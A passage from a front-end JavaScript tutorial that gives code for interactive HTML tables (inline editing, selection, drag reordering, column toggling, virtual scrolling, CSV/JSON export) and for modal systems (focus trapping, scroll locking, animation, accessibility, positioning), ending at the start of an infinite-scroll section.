      if (e.key === 'Enter') {
        this.blur();
      } else if (e.key === 'Escape') {
        cell.textContent = originalValue;
      }
    });
    
    this.textContent = '';
    this.appendChild(input);
    input.focus();
  });
}

// Make all cells in tbody editable
Array.from(table.tBodies[0].rows).forEach(row => {
  Array.from(row.cells).forEach(cell => makeCellEditable(cell));
});
```

#### Inline Row Editing

```javascript
function enableRowEditing(table) {
  const tbody = table.tBodies[0];
  
  Array.from(tbody.rows).forEach(row => {
    const editBtn = document.createElement('button');
    editBtn.textContent = 'Edit';
    
    const saveBtn = document.createElement('button');
    saveBtn.textContent = 'Save';
    saveBtn.style.display = 'none';
    
    const cancelBtn = document.createElement('button');
    cancelBtn.textContent = 'Cancel';
    cancelBtn.style.display = 'none';
    
    const actionCell = row.insertCell();
    actionCell.appendChild(editBtn);
    actionCell.appendChild(saveBtn);
    actionCell.appendChild(cancelBtn);
    
    let originalValues = [];
    
    editBtn.onclick = () => {
      originalValues = [];
      Array.from(row.cells).slice(0, -1).forEach(cell => {
        originalValues.push(cell.textContent);
        const input = document.createElement('input');
        input.value = cell.textContent;
        cell.textContent = '';
        cell.appendChild(input);
      });
      
      editBtn.style.display = 'none';
      saveBtn.style.display = '';
      cancelBtn.style.display = '';
    };
    
    saveBtn.onclick = () => {
      Array.from(row.cells).slice(0, -1).forEach(cell => {
        const input = cell.querySelector('input');
        if (input) {
          cell.textContent = input.value;
        }
      });
      
      resetButtons();
    };
    
    cancelBtn.onclick = () => {
      Array.from(row.cells).slice(0, -1).forEach((cell, index) => {
        cell.textContent = originalValues[index];
      });
      
      resetButtons();
    };
    
    function resetButtons() {
      editBtn.style.display = '';
      saveBtn.style.display = 'none';
      cancelBtn.style.display = 'none';
    }
  });
}
```

### Row Selection

#### Single Row Selection

```javascript
function enableRowSelection(table) {
  const tbody = table.tBodies[0];
  let selectedRow = null;
  
  Array.from(tbody.rows).forEach(row => {
    row.style.cursor = 'pointer';
    
    row.addEventListener('click', function() {
      if (selectedRow) {
        selectedRow.classList.remove('selected');
      }
      
      this.classList.add('selected');
      selectedRow = this;
    });
  });
}
```

#### Multiple Row Selection with Checkboxes

```javascript
function addRowCheckboxes(table) {
  const thead = table.tHead;
  const tbody = table.tBodies[0];
  
  // Add header checkbox
  const headerRow = thead.rows[0];
  const checkboxHeaderCell = document.createElement('th');
  const headerCheckbox = document.createElement('input');
  headerCheckbox.type = 'checkbox';
  checkboxHeaderCell.appendChild(headerCheckbox);
  headerRow.insertBefore(checkboxHeaderCell, headerRow.firstChild);
  
  // Add row checkboxes
  Array.from(tbody.rows).forEach(row => {
    const checkboxCell = row.insertCell(0);
    const checkbox = document.createElement('input');
    checkbox.type = 'checkbox';
    checkboxCell.appendChild(checkbox);
    
    checkbox.addEventListener('change', updateHeaderCheckbox);
  });
  
  // Header checkbox selects/deselects all
  headerCheckbox.addEventListener('change', function() {
    const checkboxes = tbody.querySelectorAll('input[type="checkbox"]');
    checkboxes.forEach(cb => cb.checked = this.checked);
  });
  
  function updateHeaderCheckbox() {
    const checkboxes = Array.from(tbody.querySelectorAll('input[type="checkbox"]'));
    const allChecked = checkboxes.every(cb => cb.checked);
    const someChecked = checkboxes.some(cb => cb.checked);
    
    headerCheckbox.checked = allChecked;
    headerCheckbox.indeterminate = someChecked && !allChecked;
  }
}

// Get selected rows
function getSelectedRows(table) {
  const tbody = table.tBodies[0];
  return Array.from(tbody.rows).filter(row => {
    const checkbox = row.querySelector('input[type="checkbox"]');
    return checkbox && checkbox.checked;
  });
}
```

### Drag and Drop Row Reordering

#### Basic Drag and Drop Implementation

```javascript
function enableRowDragDrop(table) {
  const tbody = table.tBodies[0];
  
  Array.from(tbody.rows).forEach(row => {
    row.draggable = true;
    
    row.addEventListener('dragstart', function(e) {
      e.dataTransfer.effectAllowed = 'move';
      e.dataTransfer.setData('text/html', this.innerHTML);
      this.classList.add('dragging');
    });
    
    row.addEventListener('dragend', function() {
      this.classList.remove('dragging');
    });
    
    row.addEventListener('dragover', function(e) {
      e.preventDefault();
      e.dataTransfer.dropEffect = 'move';
      
      const draggingRow = tbody.querySelector('.dragging');
      if (draggingRow && draggingRow !== this) {
        const rect = this.getBoundingClientRect();
        const midpoint = rect.top + rect.height / 2;
        
        if (e.clientY < midpoint) {
          tbody.insertBefore(draggingRow, this);
        } else {
          tbody.insertBefore(draggingRow, this.nextSibling);
        }
      }
    });
  });
}
```

#### Drag Handle Implementation

```javascript
function addDragHandles(table) {
  const tbody = table.tBodies[0];
  
  Array.from(tbody.rows).forEach(row => {
    const handleCell = row.insertCell(0);
    handleCell.innerHTML = '☰';
    handleCell.className = 'drag-handle';
    handleCell.style.cursor = 'grab';
    
    handleCell.addEventListener('mousedown', function() {
      row.draggable = true;
    });
    
    handleCell.addEventListener('mouseup', function() {
      row.draggable = false;
    });
    
    row.addEventListener('dragstart', function(e) {
      if (!row.draggable) {
        e.preventDefault();
        return;
      }
      this.classList.add('dragging');
    });
    
    row.addEventListener('dragend', function() {
      this.classList.remove('dragging');
      row.draggable = false;
    });
    
    row.addEventListener('dragover', function(e) {
      e.preventDefault();
      const draggingRow = tbody.querySelector('.dragging');
      
      if (draggingRow && draggingRow !== this) {
        const rect = this.getBoundingClientRect();
        const midpoint = rect.top + rect.height / 2;
        
        if (e.clientY < midpoint) {
          tbody.insertBefore(draggingRow, this);
        } else {
          tbody.insertBefore(draggingRow, this.nextSibling);
        }
      }
    });
  });
}
```

### Column Operations

#### Adding Columns Dynamically

```javascript
function addColumn(table, headerText, defaultValue = '') {
  // Add header
  const thead = table.tHead;
  if (thead) {
    const headerRow = thead.rows[0];
    const th = document.createElement('th');
    th.textContent = headerText;
    headerRow.appendChild(th);
  }
  
  // Add cells to all rows
  const tbody = table.tBodies[0];
  Array.from(tbody.rows).forEach(row => {
    const cell = row.insertCell();
    cell.textContent = defaultValue;
  });
}
```

#### Removing Columns

```javascript
function removeColumn(table, columnIndex) {
  // Remove header
  const thead = table.tHead;
  if (thead) {
    const headerRow = thead.rows[0];
    headerRow.deleteCell(columnIndex);
  }
  
  // Remove cells from all rows
  const tbody = table.tBodies[0];
  Array.from(tbody.rows).forEach(row => {
    if (row.cells[columnIndex]) {
      row.deleteCell(columnIndex);
    }
  });
}
```

#### Hiding/Showing Columns

```javascript
function toggleColumn(table, columnIndex, visible) {
  const display = visible ? '' : 'none';
  
  // Hide/show header
  const thead = table.tHead;
  if (thead) {
    const headerRow = thead.rows[0];
    if (headerRow.cells[columnIndex]) {
      headerRow.cells[columnIndex].style.display = display;
    }
  }
  
  // Hide/show cells in all rows
  Array.from(table.tBodies).forEach(tbody => {
    Array.from(tbody.rows).forEach(row => {
      if (row.cells[columnIndex]) {
        row.cells[columnIndex].style.display = display;
      }
    });
  });
}

function createColumnToggleControls(table, container) {
  const thead = table.tHead;
  if (!thead) return;
  
  const headers = Array.from(thead.rows[0].cells);
  
  headers.forEach((header, index) => {
    const label = document.createElement('label');
    const checkbox = document.createElement('input');
    checkbox.type = 'checkbox';
    checkbox.checked = true;
    
    checkbox.addEventListener('change', function() {
      toggleColumn(table, index, this.checked);
    });
    
    label.appendChild(checkbox);
    label.appendChild(document.createTextNode(' ' + header.textContent));
    container.appendChild(label);
    container.appendChild(document.createElement('br'));
  });
}
```

### Performance Optimization

#### Virtual Scrolling for Large Tables

```javascript
class VirtualTable {
  constructor(container, data, columns, rowHeight = 40) {
    this.container = container;
    this.data = data;
    this.columns = columns;
    this.rowHeight = rowHeight;
    this.visibleRows = Math.ceil(container.clientHeight / rowHeight) + 1;
    this.startIndex = 0;
    
    this.setupContainer();
    this.render();
    
    this.container.addEventListener('scroll', () => this.handleScroll());
  }
  
  setupContainer() {
    this.container.style.overflow = 'auto';
    this.container.style.position = 'relative';
    
    this.table = document.createElement('table');
    this.thead = this.table.createTHead();
    this.tbody = this.table.createTBody();
    
    // Create header
    const headerRow = this.thead.insertRow();
    this.columns.forEach(col => {
      const th = document.createElement('th');
      th.textContent = col;
      headerRow.appendChild(th);
    });
    
    // Create spacer for scrolling
    this.spacer = document.createElement('div');
    this.spacer.style.height = `${this.data.length * this.rowHeight}px`;
    
    this.container.appendChild(this.spacer);
    this.container.appendChild(this.table);
  }
  
  render() {
    this.tbody.innerHTML = '';
    const endIndex = Math.min(this.startIndex + this.visibleRows, this.data.length);
    
    for (let i = this.startIndex; i < endIndex; i++) {
      const row = this.tbody.insertRow();
      this.data[i].forEach(cellData => {
        const cell = row.insertCell();
        cell.textContent = cellData;
      });
    }
    
    this.table.style.transform = `translateY(${this.startIndex * this.rowHeight}px)`;
  }
  
  handleScroll() {
    const scrollTop = this.container.scrollTop;
    const newStartIndex = Math.floor(scrollTop / this.rowHeight);
    
    if (newStartIndex !== this.startIndex) {
      this.startIndex = newStartIndex;
      this.render();
    }
  }
}
```

#### Batch DOM Updates

```javascript
function batchUpdateRows(table, updates) {
  // updates: [{rowIndex: 0, columnIndex: 1, value: 'New Value'}, ...]
  
  // Detach table from DOM during updates
  const parent = table.parentNode;
  const nextSibling = table.nextSibling;
  parent.removeChild(table);
  
  // Apply all updates
  updates.forEach(update => {
    const row = table.rows[update.rowIndex];
    if (row && row.cells[update.columnIndex]) {
      row.cells[update.columnIndex].textContent = update.value;
    }
  });
  
  // Reattach table
  parent.insertBefore(table, nextSibling);
}
```

#### Debounced Search/Filter

```javascript
function debounce(func, wait) {
  let timeout;
  return function executedFunction(...args) {
    const later = () => {
      clearTimeout(timeout);
      func(...args);
    };
    clearTimeout(timeout);
    timeout = setTimeout(later, wait);
  };
}

const debouncedSearch = debounce((table, searchTerm) => {
  searchTable(table, searchTerm);
}, 300);

// Usage
searchInput.addEventListener('input', (e) => {
  debouncedSearch(table, e.target.value);
});
```

### Export Functionality

#### Export to CSV

```javascript
function exportTableToCSV(table, filename = 'table.csv') {
  const rows = [];
  
  // Get headers
  if (table.tHead) {
    const headerRow = Array.from(table.tHead.rows[0].cells)
      .map(cell => cell.textContent);
    rows.push(headerRow);
  }
  
  // Get data rows
  Array.from(table.tBodies[0].rows).forEach(row => {
    const rowData = Array.from(row.cells)
      .map(cell => {
        let text = cell.textContent;
        // Escape quotes and wrap in quotes if contains comma
        if (text.includes(',') || text.includes('"') || text.includes('\n')) {
          text = '"' + text.replace(/"/g, '""') + '"';
        }
        return text;
      });
    rows.push(rowData);
  });
  
  const csvContent = rows.map(row => row.join(',')).join('\n');
  const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
  const link = document.createElement('a');
  const url = URL.createObjectURL(blob);
  
  link.setAttribute('href', url);
  link.setAttribute('download', filename);
  link.style.visibility = 'hidden';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}
```

#### Export to JSON

```javascript
function exportTableToJSON(table) {
  const headers = Array.from(table.tHead.rows[0].cells)
    .map(cell => cell.textContent);
  
  const data = Array.from(table.tBodies[0].rows).map(row => {
    const rowData = {};
    Array.from(row.cells).forEach((cell, index) => {
      rowData[headers[index]] = cell.textContent;
    });
    return rowData;
  });
  
  return JSON.stringify(data, null, 2);
}
```

### State Management

#### Saving Table State

```javascript
class TableStateManager {
  constructor(table, storageKey) {
    this.table = table;
    this.storageKey = storageKey;
  }
  
  saveState() {
    const state = {
      data: this.getTableData(),
      sortColumn: this.table.dataset.sortColumn,
      sortDirection: this.table.dataset.sortDirection,
      hiddenColumns: this.getHiddenColumns(),
      pageSize: this.table.dataset.pageSize
    };
    
    localStorage.setItem(this.storageKey, JSON.stringify(state));
  }
  
  loadState() {
    const stateJson = localStorage.getItem(this.storageKey);
    if (!stateJson) return null;
    
    return JSON.parse(stateJson);
  }
  
  getTableData() {
    const data = [];
    const tbody = this.table.tBodies[0];
    
    Array.from(tbody.rows).forEach(row => {
      const rowData = Array.from(row.cells).map(cell => cell.textContent);
      data.push(rowData);
    });
    
    return data;
  }
  
  getHiddenColumns() {
    const hidden = [];
    const headerRow = this.table.tHead.rows[0];
    
    Array.from(headerRow.cells).forEach((cell, index) => {
      if (cell.style.display === 'none') {
        hidden.push(index);
      }
    });
    
    return hidden;
  }
  
  restoreState(state) {
    if (!state) return;
    
    // Restore hidden columns
    if (state.hiddenColumns) {
      state.hiddenColumns.forEach(index => {
        toggleColumn(this.table, index, false);
      });
    }
    
    // Restore sort
    if (state.sortColumn !== undefined) {
      sortTable(this.table, state.sortColumn, state.sortDirection === 'asc');
    }
  }
}
```

### Event Delegation for Dynamic Tables

```javascript
function setupTableEventDelegation(table) {
  table.addEventListener('click', function(e) {
    const target = e.target;
    const cell = target.closest('td');
    const row = target.closest('tr');
    
    // Handle cell clicks
    if (cell) {
      console.log('Cell clicked:', cell.cellIndex, cell.textContent);
    }
    
	// Handle button clicks
	if (target.matches('button.delete-btn')) {
	    e.stopPropagation();
	    const rowIndex = row.rowIndex;
	    table.deleteRow(rowIndex);
	}
	
	if (target.matches('button.edit-btn')) {
	    e.stopPropagation();
	    // Edit logic
	}
	});
	
	// Handle input changes
	table.addEventListener('change', function (e) {
	    if (e.target.matches('input[type="checkbox"]')) {
	        const row = e.target.closest('tr');
	        row.classList.toggle('selected', e.target.checked);
	    }
	});
}
````

### Responsive Tables

#### Horizontal Scrolling Wrapper

```javascript
function makeTableResponsive(table) {
  const wrapper = document.createElement('div');
  wrapper.className = 'table-responsive';
  wrapper.style.overflowX = 'auto';
  wrapper.style.webkitOverflowScrolling = 'touch';
  
  table.parentNode.insertBefore(wrapper, table);
  wrapper.appendChild(table);
}
````

#### Collapsible Columns for Mobile

```javascript
function makeTableCollapsible(table, priorityColumns) {
  // priorityColumns: array of column indices that should always be visible
  const mediaQuery = window.matchMedia('(max-width: 768px)');
  
  function handleResize(e) {
    const headerRow = table.tHead.rows[0];
    
    Array.from(headerRow.cells).forEach((cell, index) => {
      const isVisible = e.matches ? priorityColumns.includes(index) : true;
      toggleColumn(table, index, isVisible);
    });
  }
  
  mediaQuery.addListener(handleResize);
  handleResize(mediaQuery);
}
```

---

## Modal and Overlay Systems

### DOM Structure Patterns

#### Portal-based Architecture

Modals typically render outside the normal component hierarchy to avoid z-index conflicts and positioning constraints. The portal pattern involves creating a dedicated container at the document body level:

```javascript
// Create portal container
const portalRoot = document.getElementById('modal-root') || (() => {
  const div = document.createElement('div');
  div.id = 'modal-root';
  document.body.appendChild(div);
  return div;
})();
```

The modal content is then injected into this container while maintaining logical parent-child relationships in the component tree.

#### Layered Container Strategy

Complex applications often maintain multiple overlay layers:

- **Base layer**: Standard modals and dialogs
- **Elevated layer**: Priority modals (confirmations, alerts)
- **Toast layer**: Non-blocking notifications
- **Tooltip layer**: Contextual helpers

Each layer manages its own z-index range, preventing stacking conflicts.

### Focus Management

#### Focus Trapping

When a modal opens, keyboard focus must be constrained within the modal boundary. Implementation involves:

```javascript
function trapFocus(element) {
  const focusableElements = element.querySelectorAll(
    'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
  );
  const firstElement = focusableElements[0];
  const lastElement = focusableElements[focusableElements.length - 1];

  element.addEventListener('keydown', (e) => {
    if (e.key !== 'Tab') return;
    
    if (e.shiftKey) {
      if (document.activeElement === firstElement) {
        lastElement.focus();
        e.preventDefault();
      }
    } else {
      if (document.activeElement === lastElement) {
        firstElement.focus();
        e.preventDefault();
      }
    }
  });
}
```

#### Initial Focus Assignment

The modal should focus the first interactive element or a designated primary action on open. For destructive actions, focus the cancel button to prevent accidental confirmation.

#### Return Focus

Store the previously focused element before opening the modal:

```javascript
const previouslyFocused = document.activeElement;
// ... open modal
// On close:
previouslyFocused?.focus();
```

### Scroll Behavior Control

#### Body Scroll Lock

Prevent background scrolling when modals are active:

```javascript
function lockScroll() {
  const scrollbarWidth = window.innerWidth - document.documentElement.clientWidth;
  document.body.style.overflow = 'hidden';
  document.body.style.paddingRight = `${scrollbarWidth}px`;
}

function unlockScroll() {
  document.body.style.overflow = '';
  document.body.style.paddingRight = '';
}
```

The padding compensation prevents layout shift when the scrollbar disappears.

#### Nested Modal Considerations

Track active modal count to handle multiple overlays:

```javascript
let modalCount = 0;

function openModal() {
  if (modalCount === 0) lockScroll();
  modalCount++;
}

function closeModal() {
  modalCount--;
  if (modalCount === 0) unlockScroll();
}
```

#### iOS Touch Handling

Mobile Safari requires additional measures:

```javascript
let scrollPosition = 0;

function lockScrollMobile() {
  scrollPosition = window.pageYOffset;
  document.body.style.position = 'fixed';
  document.body.style.top = `-${scrollPosition}px`;
  document.body.style.width = '100%';
}

function unlockScrollMobile() {
  document.body.style.position = '';
  document.body.style.top = '';
  window.scrollTo(0, scrollPosition);
}
```

### Event Handling

#### Backdrop Click Detection

Distinguish between backdrop clicks and modal content clicks:

```javascript
overlay.addEventListener('click', (e) => {
  if (e.target === overlay) {
    closeModal();
  }
});
```

Alternative approach using mousedown/mouseup coordination:

```javascript
let mouseDownTarget = null;

overlay.addEventListener('mousedown', (e) => {
  mouseDownTarget = e.target;
});

overlay.addEventListener('click', (e) => {
  if (e.target === overlay && mouseDownTarget === overlay) {
    closeModal();
  }
  mouseDownTarget = null;
});
```

This prevents false closes when dragging starts inside the modal and ends on the backdrop.

#### Escape Key Handling

Close modals with the Escape key:

```javascript
function handleEscape(e) {
  if (e.key === 'Escape') {
    closeTopmostModal();
  }
}

document.addEventListener('keydown', handleEscape);
```

For nested modals, only the topmost should respond to Escape.

#### Event Propagation Control

Prevent modal content events from bubbling to backdrop handlers:

```javascript
modalContent.addEventListener('click', (e) => {
  e.stopPropagation();
});
```

### Animation and Transitions

#### CSS-based Transitions

Apply classes for enter/exit animations:

```javascript
function openModal(modal) {
  modal.classList.add('modal-entering');
  
  requestAnimationFrame(() => {
    modal.classList.add('modal-active');
    modal.classList.remove('modal-entering');
  });
}

function closeModal(modal) {
  modal.classList.add('modal-exiting');
  
  modal.addEventListener('transitionend', () => {
    modal.remove();
  }, { once: true });
}
```

Corresponding CSS:

```css
.modal-entering {
  opacity: 0;
  transform: scale(0.95);
}

.modal-active {
  opacity: 1;
  transform: scale(1);
  transition: opacity 200ms, transform 200ms;
}

.modal-exiting {
  opacity: 0;
  transform: scale(0.95);
  transition: opacity 150ms, transform 150ms;
}
```

#### JavaScript Animation Control

For complex animations, use the Web Animations API:

```javascript
modal.animate([
  { opacity: 0, transform: 'translateY(-20px)' },
  { opacity: 1, transform: 'translateY(0)' }
], {
  duration: 250,
  easing: 'cubic-bezier(0.4, 0, 0.2, 1)',
  fill: 'forwards'
});
```

#### Stagger Animations

For modals with multiple elements, coordinate animations:

```javascript
const elements = modal.querySelectorAll('.animate-item');
elements.forEach((el, index) => {
  el.style.animationDelay = `${index * 50}ms`;
});
```

### State Management

#### Single Modal Manager

Centralized control for modal lifecycle:

```javascript
class ModalManager {
  constructor() {
    this.stack = [];
    this.container = document.getElementById('modal-root');
  }

  open(config) {
    const modal = this.createModal(config);
    this.stack.push(modal);
    this.container.appendChild(modal.element);
    modal.open();
    return modal;
  }

  close(modal) {
    const index = this.stack.indexOf(modal);
    if (index > -1) {
      this.stack.splice(index, 1);
      modal.close();
    }
  }

  closeAll() {
    while (this.stack.length > 0) {
      this.close(this.stack[this.stack.length - 1]);
    }
  }

  getTopModal() {
    return this.stack[this.stack.length - 1];
  }
}
```

#### Multi-Modal Coordination

Handle z-index stacking for nested modals:

```javascript
open(config) {
  const baseZIndex = 1000;
  const zIndex = baseZIndex + (this.stack.length * 10);
  
  const modal = this.createModal({
    ...config,
    zIndex
  });
  
  this.stack.push(modal);
}
```

#### State Persistence

Track modal state for restoration:

```javascript
class Modal {
  constructor(id, config) {
    this.id = id;
    this.config = config;
    this.data = {};
  }

  saveState() {
    sessionStorage.setItem(
      `modal-${this.id}`,
      JSON.stringify(this.data)
    );
  }

  restoreState() {
    const saved = sessionStorage.getItem(`modal-${this.id}`);
    if (saved) {
      this.data = JSON.parse(saved);
    }
  }
}
```

### Accessibility Implementation

#### ARIA Attributes

Essential attributes for screen reader support:

```html
<div role="dialog" 
     aria-modal="true"
     aria-labelledby="modal-title"
     aria-describedby="modal-description">
  <h2 id="modal-title">Modal Title</h2>
  <div id="modal-description">Modal content description</div>
</div>
```

#### Alert Dialogs

For modals requiring immediate attention:

```html
<div role="alertdialog"
     aria-modal="true"
     aria-labelledby="alert-title"
     aria-describedby="alert-description">
  <!-- Content -->
</div>
```

#### Live Region Announcements

Notify screen readers when modals open:

```javascript
function announceModal(title) {
  const announcer = document.createElement('div');
  announcer.setAttribute('role', 'status');
  announcer.setAttribute('aria-live', 'polite');
  announcer.className = 'sr-only';
  announcer.textContent = `Dialog opened: ${title}`;
  document.body.appendChild(announcer);
  
  setTimeout(() => announcer.remove(), 1000);
}
```

#### Keyboard Navigation

Ensure all interactive elements are keyboard accessible:

```javascript
modal.addEventListener('keydown', (e) => {
  // Close on Escape
  if (e.key === 'Escape') {
    closeModal();
  }
  
  // Activate on Enter (for non-button elements)
  if (e.key === 'Enter' && e.target.hasAttribute('role')) {
    e.target.click();
  }
});
```

### Performance Optimization

#### Lazy Rendering

Create modal DOM only when needed:

```javascript
class LazyModal {
  constructor(contentFactory) {
    this.contentFactory = contentFactory;
    this.element = null;
  }

  open() {
    if (!this.element) {
      this.element = this.contentFactory();
      document.body.appendChild(this.element);
    }
    this.element.classList.add('active');
  }

  destroy() {
    this.element?.remove();
    this.element = null;
  }
}
```

#### Virtual Scrolling for Large Lists

For modals containing extensive lists:

```javascript
class VirtualList {
  constructor(container, items, rowHeight) {
    this.container = container;
    this.items = items;
    this.rowHeight = rowHeight;
    this.visibleStart = 0;
    this.visibleEnd = 0;
    
    this.container.addEventListener('scroll', () => this.render());
    this.render();
  }

  render() {
    const scrollTop = this.container.scrollTop;
    const viewportHeight = this.container.clientHeight;
    
    this.visibleStart = Math.floor(scrollTop / this.rowHeight);
    this.visibleEnd = Math.ceil((scrollTop + viewportHeight) / this.rowHeight);
    
    // Render only visible items
    const fragment = document.createDocumentFragment();
    for (let i = this.visibleStart; i < this.visibleEnd; i++) {
      if (this.items[i]) {
        const row = this.createRow(this.items[i], i);
        fragment.appendChild(row);
      }
    }
    
    this.container.innerHTML = '';
    this.container.appendChild(fragment);
  }
}
```

#### Intersection Observer for Backdrop

Optimize backdrop rendering for multiple modals:

```javascript
const backdropObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.classList.add('visible');
    } else {
      entry.target.classList.remove('visible');
    }
  });
});
```

#### RequestAnimationFrame Batching

Batch DOM updates for smooth animations:

```javascript
class AnimationBatcher {
  constructor() {
    this.queue = [];
    this.scheduled = false;
  }

  add(callback) {
    this.queue.push(callback);
    if (!this.scheduled) {
      this.scheduled = true;
      requestAnimationFrame(() => this.flush());
    }
  }

  flush() {
    this.queue.forEach(cb => cb());
    this.queue = [];
    this.scheduled = false;
  }
}
```

### Memory Management

#### Cleanup Patterns

Properly dispose of modals to prevent memory leaks:

```javascript
class Modal {
  constructor() {
    this.listeners = [];
  }

  addEventListener(element, event, handler) {
    element.addEventListener(event, handler);
    this.listeners.push({ element, event, handler });
  }

  destroy() {
    // Remove all event listeners
    this.listeners.forEach(({ element, event, handler }) => {
      element.removeEventListener(event, handler);
    });
    this.listeners = [];
    
    // Remove DOM elements
    this.element?.remove();
    this.element = null;
  }
}
```

#### WeakMap for Modal Data

Store modal-associated data without preventing garbage collection:

```javascript
const modalData = new WeakMap();

function attachData(modal, data) {
  modalData.set(modal, data);
}

function getData(modal) {
  return modalData.get(modal);
}
```

#### Circular Reference Prevention

Avoid memory leaks from circular references:

```javascript
class ModalController {
  constructor(modal) {
    // Store weak reference
    this.modalRef = new WeakRef(modal);
  }

  getModal() {
    return this.modalRef.deref();
  }
}
```

### Advanced Positioning

#### Dynamic Positioning

Calculate optimal position based on viewport:

```javascript
function positionModal(modal, trigger) {
  const triggerRect = trigger.getBoundingClientRect();
  const modalRect = modal.getBoundingClientRect();
  const viewport = {
    width: window.innerWidth,
    height: window.innerHeight
  };

  let top = triggerRect.bottom + 8;
  let left = triggerRect.left;

  // Flip if overflows bottom
  if (top + modalRect.height > viewport.height) {
    top = triggerRect.top - modalRect.height - 8;
  }

  // Adjust if overflows right
  if (left + modalRect.width > viewport.width) {
    left = viewport.width - modalRect.width - 16;
  }

  modal.style.top = `${top}px`;
  modal.style.left = `${left}px`;
}
```

#### Collision Detection

Prevent overlapping with other UI elements:

```javascript
function hasCollision(rect1, rect2) {
  return !(
    rect1.right < rect2.left ||
    rect1.left > rect2.right ||
    rect1.bottom < rect2.top ||
    rect1.top > rect2.bottom
  );
}

function findSafePosition(modal, obstacles) {
  const modalRect = modal.getBoundingClientRect();
  const positions = generateCandidatePositions(modalRect);
  
  for (const pos of positions) {
    const testRect = {
      left: pos.x,
      top: pos.y,
      right: pos.x + modalRect.width,
      bottom: pos.y + modalRect.height
    };
    
    if (!obstacles.some(obs => hasCollision(testRect, obs))) {
      return pos;
    }
  }
  
  return positions[0]; // Fallback to default
}
```

#### Viewport Constraints

Keep modals within viewport boundaries:

```javascript
function constrainToViewport(modal) {
  const rect = modal.getBoundingClientRect();
  const padding = 16;
  
  let { top, left } = rect;
  
  if (left < padding) left = padding;
  if (top < padding) top = padding;
  if (rect.right > window.innerWidth - padding) {
    left = window.innerWidth - rect.width - padding;
  }
  if (rect.bottom > window.innerHeight - padding) {
    top = window.innerHeight - rect.height - padding;
  }
  
  modal.style.transform = `translate(${left}px, ${top}px)`;
}
```

### Responsive Behavior

#### Breakpoint-based Rendering

Adjust modal presentation for different screen sizes:

```javascript
class ResponsiveModal {
  constructor(config) {
    this.config = config;
    this.mediaQueries = {
      mobile: window.matchMedia('(max-width: 768px)'),
      tablet: window.matchMedia('(min-width: 769px) and (max-width: 1024px)'),
      desktop: window.matchMedia('(min-width: 1025px)')
    };
    
    this.setupMediaListeners();
  }

  setupMediaListeners() {
    Object.values(this.mediaQueries).forEach(mq => {
      mq.addEventListener('change', () => this.updateLayout());
    });
  }

  updateLayout() {
    if (this.mediaQueries.mobile.matches) {
      this.applyMobileLayout();
    } else if (this.mediaQueries.tablet.matches) {
      this.applyTabletLayout();
    } else {
      this.applyDesktopLayout();
    }
  }

  applyMobileLayout() {
    this.element.classList.add('modal-fullscreen');
    this.element.classList.remove('modal-centered', 'modal-sidebar');
  }
}
```

#### Touch Gesture Support

Enable swipe-to-dismiss on mobile:

```javascript
class SwipeableModal {
  constructor(modal) {
    this.modal = modal;
    this.startY = 0;
    this.currentY = 0;
    this.isDragging = false;
    
    this.setupTouchHandlers();
  }

  setupTouchHandlers() {
    this.modal.addEventListener('touchstart', (e) => {
      this.startY = e.touches[0].clientY;
      this.isDragging = true;
    });

    this.modal.addEventListener('touchmove', (e) => {
      if (!this.isDragging) return;
      
      this.currentY = e.touches[0].clientY;
      const deltaY = this.currentY - this.startY;
      
      if (deltaY > 0) {
        this.modal.style.transform = `translateY(${deltaY}px)`;
      }
    });

    this.modal.addEventListener('touchend', () => {
      const deltaY = this.currentY - this.startY;
      
      if (deltaY > 100) {
        this.close();
      } else {
        this.modal.style.transform = '';
      }
      
      this.isDragging = false;
    });
  }
}
```

#### Orientation Change Handling

Respond to device orientation changes:

```javascript
window.addEventListener('orientationchange', () => {
  const modals = document.querySelectorAll('.modal.active');
  modals.forEach(modal => {
    recalculatePosition(modal);
    adjustContentHeight(modal);
  });
});
```

### Error Handling

#### Graceful Degradation

Handle failures without breaking the UI:

```javascript
class RobustModal {
  async open() {
    try {
      await this.loadContent();
      this.render();
      this.attachEvents();
    } catch (error) {
      console.error('Modal error:', error);
      this.showErrorState();
    }
  }

  showErrorState() {
    this.element.innerHTML = `
      <div class="modal-error">
        <p>Unable to load content</p>
        <button onclick="this.closest('.modal').remove()">Close</button>
      </div>
    `;
  }
}
```

#### Timeout Protection

Prevent indefinite loading states:

```javascript
async function openModalWithTimeout(modalFactory, timeout = 5000) {
  const timeoutPromise = new Promise((_, reject) => {
    setTimeout(() => reject(new Error('Modal timeout')), timeout);
  });

  try {
    const modal = await Promise.race([
      modalFactory(),
      timeoutPromise
    ]);
    return modal;
  } catch (error) {
    showErrorModal('Content failed to load');
  }
}
```

#### State Recovery

Restore application state if modal crashes:

```javascript
class SafeModalManager {
  constructor() {
    this.stateBackup = null;
  }

  open(modal) {
    this.stateBackup = this.captureState();
    
    try {
      modal.open();
    } catch (error) {
      this.restoreState(this.stateBackup);
      throw error;
    }
  }

  captureState() {
    return {
      scrollPosition: window.scrollY,
      focusedElement: document.activeElement,
      bodyOverflow: document.body.style.overflow
    };
  }

  restoreState(state) {
    window.scrollTo(0, state.scrollPosition);
    state.focusedElement?.focus();
    document.body.style.overflow = state.bodyOverflow;
  }
}
```

---

## Infinite Scroll Implementation

### Core Implementation Patterns

Infinite scroll requires three fundamental components: scroll detection, content loading, and DOM management. The scroll detection determines when to trigger loading, content loading fetches and renders new items, and DOM management prevents memory issues as the list grows.

### Scroll Detection Methods

#### Intersection Observer API

The modern approach uses Intersection Observer to detect when a sentinel element enters the viewport:

```javascript
const sentinel = document.querySelector('.sentinel');
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting && !isLoading) {
      loadMoreContent();
    }
  });
}, {
  rootMargin: '200px' // Trigger 200px before reaching sentinel
});

observer.observe(sentinel);
```

The `rootMargin` parameter controls the trigger distance. Positive values load content before the user reaches the bottom, improving perceived performance. Negative values delay loading until after the sentinel is visible.

#### Scroll Event Listener

Legacy implementations calculate scroll position manually:

```javascript
window.addEventListener('scroll', () => {
  const scrollTop = window.scrollY;
  const windowHeight = window.innerHeight;
  const docHeight = document.documentElement.scrollHeight;
  
  if (scrollTop + windowHeight >= docHeight - 300 && !isLoading) {
    loadMoreContent();
  }
});
```

This approach requires throttling or debouncing to limit calculation frequency:

```javascript
let scrollTimeout;
